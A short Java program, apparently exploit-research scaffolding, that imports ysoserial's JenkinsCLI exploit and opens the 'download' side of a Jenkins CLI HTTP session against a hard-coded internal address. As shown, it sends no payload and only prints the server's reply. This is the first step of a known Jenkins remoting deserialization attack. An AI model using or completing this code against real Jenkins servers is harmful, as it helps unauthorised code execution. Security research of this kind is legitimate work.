import hudson.cli.CLI;
import hudson.cli.FullDuplexHttpStream;
import hudson.remoting.Channel;
import ysoserial.exploit.JenkinsCLI;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.UUID;

/**
 * @Author: r00t4dm
 * @Date: 2022/1/7 6:37 下午
 */
public class HttpSend {
    public static void main(String[] args) throws IOException, InterruptedException {
        URL target = new URL("http://192.168.99.148:8080/jenkins/cli");
        UUID uuid = UUID.randomUUID();
        HttpURLConnection con = (HttpURLConnection)target.openConnection();
        con.setRequestMethod("POST");
        con.addRequestProperty("User-Agent", "curl/7.36.0");
        con.addRequestProperty("Accept", "*/*");
        con.addRequestProperty("Session", uuid.toString());
        con.addRequestProperty("Side", "download");
        con.addRequestProperty("Content-Type", "application/x-www-form-urlencoded");
        con.setReadTimeout(60000);
        con.connect();

        InputStream is = con.getInputStream();
        BufferedReader br = new BufferedReader(new InputStreamReader(is, "UTF-8"));
        StringBuffer sbf = new StringBuffer();
        String temp = null;
        while ((temp = br.readLine()) != null) {
            sbf.append(temp);
        }
        String result = sbf.toString();
        System.out.println(result);

    }
}
